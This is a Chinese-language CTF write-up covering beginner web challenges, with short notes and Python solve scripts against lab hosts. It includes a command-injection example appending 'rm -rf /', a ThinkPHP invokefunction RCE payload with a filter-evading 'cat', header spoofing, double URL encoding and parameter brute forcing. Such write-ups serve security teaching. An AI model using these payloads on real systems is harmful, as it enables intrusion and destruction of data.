---
title: web入门
createTime: 2025/03/23 15:32:25
permalink: /security/6n77geb9/
---

## weak auth 弱口令

BurpSuite or Python 字典暴力破解

## simple_php

```php
<?php
show_source(__FILE__);
include("config.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
// 如果 $a 大于0且 $a 为真
if($a==0 and $a){
    echo $flag1;
}
// 如果 $b 是数字，退出脚本
if(is_numeric($b)){
    exit();
}
// 如果 $b 大于 1234，输出 $flag2
if($b>1234){
    echo $flag2;
}
?>
```
> php的数据类型转换

在PHP中，字符串 "0" 会被视为假值，但字符串 "0abc" 会被视为真值。因此，我们可以尝试将 $a 设置为 "0abc"。

而"0abc" == 0 在PHP中为真，因为字符串会被转换为数字 0。


## Training-WWW-Robots

有时候，`robots.txt`会暴露网站的目录结构，而不是保护内容不被抓取。

## command_execution

WAF（Web Application Firewall，Web应用防火墙）

ping 功能通常会调用系统命令来执行网络请求。如果没有对用户输入进行严格的验证和过滤，攻击者可以通过构造恶意输入来`注入额外的系统命令`。

```php
<?php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>
// ping -c 4 127.0.0.1; rm -rf /
```

## xff_referer

​X-Forwarded-For（XFF）​ 和 ​Referer 是 HTTP 请求头中常见的字段，但它们可以被伪造。X老师提醒小宁这一点，是因为在实际开发和渗透测试中，很多开发者会依赖这些字段进行验证或过滤，而攻击者可以通过伪造这些字段来绕过限制或进行恶意操作。

X-Forwarded-For 是一个 HTTP 请求头，通常用于标识客户端的原始 IP 地址。当请求经过代理服务器或负载均衡器时，代理服务器会将客户端的真实 IP 地址添加到 X-Forwarded-For 中。

Referer 是一个 HTTP 请求头，用于标识请求是从哪个页面或 URL 发起的。

​HTTP 头的本质：HTTP 请求头是由客户端（如浏览器或工具）发送的，客户端可以随意修改这些字段。

```python
import requests

url = "http://61.147.171.105:60835/"

headers = {
    "X-Forwarded-For": "123.123.123.123",
    "Referer": "https://www.google.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
}

response = requests.get(url, headers=headers)

response.encoding = "utf-8"

print(response.text)
```

## baby_web

重定向，http请求头

```python
import requests

url = "http://61.147.171.105:56645/index.php"

headers = {
    "X-Forwarded-For": "123.123.123.123",
    "Referer": "https://www.google.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
}

response = requests.get(url, headers=headers, allow_redirects=False)

response.encoding = "utf-8"

print(response.text)

headers = response.headers
for key, value in headers.items():
    print(f"{key}: {value}")
```

## simple_js


## PHP2

`index.phps`查看源代码。

```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>

Can you anthenticate to this website?
```

一次编码不够，二次编码`admin`为`%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`

## ics-06

```python
import requests

url = "http://61.147.171.105:49811/index.php"

param_name = "id"

for value in range(1, 5000):
    full_url = f"{url}?{param_name}={value}"

    response = requests.get(full_url)

    response.encoding = "utf-8"
    if len(response.text) != 1545:
        print(f"{value} | {len(response.text)}")
```

## unserialize3


## php_rce

think_php漏洞

tail 代替 cat

cat flag绕过

```python
import requests

url = r"http://61.147.171.105:57525//index.php/"

mid = r"?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]="

payload = r"cd /;ca\t /flag"

url = url + mid + payload

response = requests.get(url)

response.encoding = "utf-8"

print(response.text)
```

##